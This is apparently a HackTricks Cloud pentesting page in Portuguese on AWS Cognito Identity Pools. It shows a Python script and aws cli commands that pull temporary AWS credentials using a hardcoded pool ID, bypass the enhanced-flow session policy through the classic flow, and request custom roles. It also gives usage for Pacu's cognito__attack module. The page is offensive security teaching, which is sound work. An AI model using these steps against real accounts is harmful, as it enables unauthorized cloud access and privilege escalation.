# Pools de Identidade do Cognito

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks Especialista em Equipe Vermelha da AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking na GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks Especialista em Equipe Vermelha da GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

As pools de identidade desempenham um papel crucial ao permitir que seus usu√°rios **adquiram credenciais tempor√°rias**. Essas credenciais s√£o essenciais para acessar v√°rios servi√ßos da AWS, incluindo, mas n√£o se limitando ao Amazon S3 e DynamoDB. Uma caracter√≠stica not√°vel das pools de identidade √© o suporte tanto para usu√°rios convidados an√¥nimos quanto para uma variedade de provedores de identidade para autentica√ß√£o do usu√°rio. Os provedores de identidade suportados incluem:

- Pools de usu√°rios do Amazon Cognito
- Op√ß√µes de login social como Facebook, Google, Login com Amazon e Entrar com Apple
- Provedores compat√≠veis com OpenID Connect (OIDC)
- Provedores de identidade SAML (Security Assertion Markup Language)
- Identidades autenticadas pelo desenvolvedor
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Para gerar sess√µes de Identity Pool, primeiro voc√™ precisa **gerar um ID de Identidade**. Este ID de Identidade √© a **identifica√ß√£o da sess√£o desse usu√°rio**. Essas identifica√ß√µes podem ter at√© 20 conjuntos de dados que podem armazenar at√© 1MB de pares chave-valor.

Isso √© **√∫til para manter informa√ß√µes de um usu√°rio** (que sempre estar√° usando o mesmo ID de Identidade).

Al√©m disso, o servi√ßo **cognito-sync** √© o servi√ßo que permite **gerenciar e sincronizar essas informa√ß√µes** (nos conjuntos de dados, enviando informa√ß√µes em fluxos e mensagens SNS...).

### Ferramentas para pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), o framework de explora√ß√£o da AWS, agora inclui os m√≥dulos "cognito\_\_enum" e "cognito\_\_attack" que automatizam a enumera√ß√£o de todos os ativos do Cognito em uma conta e sinalizam configura√ß√µes fracas, atributos de usu√°rio usados para controle de acesso, etc., e tamb√©m automatizam a cria√ß√£o de usu√°rios (incluindo suporte para MFA) e escalonamento de privil√©gios com base em atributos personaliz√°veis modific√°veis, credenciais de pool de identidade utiliz√°veis, fun√ß√µes assum√≠veis em tokens de ID, etc.

Para uma descri√ß√£o das fun√ß√µes dos m√≥dulos, consulte a parte 2 da [postagem no blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instru√ß√µes de instala√ß√£o, consulte a p√°gina principal do [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Exemplo de uso do cognito\_\_attack para tentar a cria√ß√£o de usu√°rio e todos os vetores de escalonamento de privil√©gios contra um determinado pool de identidade e cliente de pool de usu√°rios:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Exemplo de uso do cognito\_\_enum para reunir todos os grupos de usu√°rios, clientes de grupos de usu√°rios, pools de identidade, usu√°rios, etc. vis√≠veis na conta AWS atual:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) √© uma ferramenta CLI em python que implementa diferentes ataques no Cognito, incluindo a cria√ß√£o indesejada de contas e escalonamento de pool de identidade.

#### Instala√ß√£o
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para mais informa√ß√µes, acesse https://github.com/padok-team/cognito-scanner

## Acessando Fun√ß√µes IAM

### N√£o autenticado

A √∫nica coisa que um atacante precisa saber para **obter credenciais da AWS** em um aplicativo Cognito como usu√°rio n√£o autenticado √© o **ID do Pool de Identidade**, e este **ID deve ser codificado** no **aplicativo** web/m√≥vel para que ele o utilize. Um ID se parece com isso: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (n√£o √© pass√≠vel de for√ßa bruta).

{% hint style="success" %}
A **fun√ß√£o IAM Cognito n√£o autenticada criada via √© chamada** por padr√£o de `Cognito_<Nome do Pool de Identidade>Unauth_Role`
{% endhint %}

Se voc√™ encontrar um ID de Pool de Identidade codificado e ele permitir usu√°rios n√£o autenticados, voc√™ pode obter credenciais da AWS com:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ou voc√™ poderia usar os seguintes **comandos aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Note que por padr√£o, um **usu√°rio Cognito n√£o autenticado N√ÉO pode ter permiss√£o alguma, mesmo que tenha sido atribu√≠da via uma pol√≠tica**. Verifique a seguinte se√ß√£o.
{% endhint %}

### Fluxo de Autentica√ß√£o Aprimorado vs B√°sico

A se√ß√£o anterior seguiu o **fluxo de autentica√ß√£o aprimorado padr√£o**. Esse fluxo define uma **pol√≠tica de sess√£o restritiva** para a sess√£o de fun√ß√£o IAM gerada. Essa pol√≠tica permitir√° apenas que a sess√£o [**utilize os servi√ßos desta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (mesmo que a fun√ß√£o tenha acesso a outros servi√ßos).

No entanto, h√° uma maneira de contornar isso, se o **pool de identidades tiver habilitado o "Fluxo B√°sico (Cl√°ssico)"**, o usu√°rio poder√° obter uma sess√£o usando esse fluxo que **n√£o ter√° essa pol√≠tica de sess√£o restritiva**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Se receber este **erro**, √© porque o **fluxo b√°sico n√£o est√° habilitado (padr√£o)**

`Ocorreu um erro (InvalidParameterException) ao chamar a opera√ß√£o GetOpenIdToken: O fluxo b√°sico (cl√°ssico) n√£o est√° habilitado, por favor, use o fluxo aprimorado.`
{% endhint %}

Tendo um conjunto de credenciais IAM, voc√™ deve verificar [quais acessos possui](../../#whoami) e tentar [elevar privil√©gios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Lembre-se de que os **usu√°rios autenticados** provavelmente ter√£o **permiss√µes diferentes**, ent√£o se voc√™ puder **se inscrever no aplicativo**, tente fazer isso e obter as novas credenciais.
{% endhint %}

Tamb√©m pode haver **fun√ß√µes** dispon√≠veis para **usu√°rios autenticados acessando o Identity Pool**.

Para isso, voc√™ pode precisar ter acesso ao **provedor de identidade**. Se for um **Cognito User Pool**, talvez voc√™ possa abusar do comportamento padr√£o e **criar um novo usu√°rio voc√™ mesmo**.

{% hint style="success" %}
A **fun√ß√£o IAM Cognito autenticada criada via √© chamada** por padr√£o de `Cognito_<Nome do Identity Pool>Auth_Role`
{% endhint %}

De qualquer forma, o **exemplo a seguir** pressup√µe que voc√™ j√° tenha feito login em um **Cognito User Pool** usado para acessar o Identity Pool (n√£o se esque√ßa de que outros tipos de provedores de identidade tamb√©m podem estar configurados).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Obtenha o identity_id da resposta do comando anterior
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# No IdToken, voc√™ pode encontrar as fun√ß√µes √†s quais um usu√°rio tem acesso por causa dos Grupos do User Pool
# Use --custom-role-arn para obter credenciais para uma fun√ß√£o espec√≠fica
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
√â poss√≠vel **configurar diferentes fun√ß√µes IAM dependendo do provedor de identidade** pelo qual o usu√°rio est√° sendo autenticado ou at√© mesmo apenas dependendo **do usu√°rio** (usando reivindica√ß√µes). Portanto, se voc√™ tiver acesso a diferentes usu√°rios atrav√©s do mesmo ou de diferentes provedores, pode valer a pena **fazer login e acessar as fun√ß√µes IAM de todos eles**.
{% endhint %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
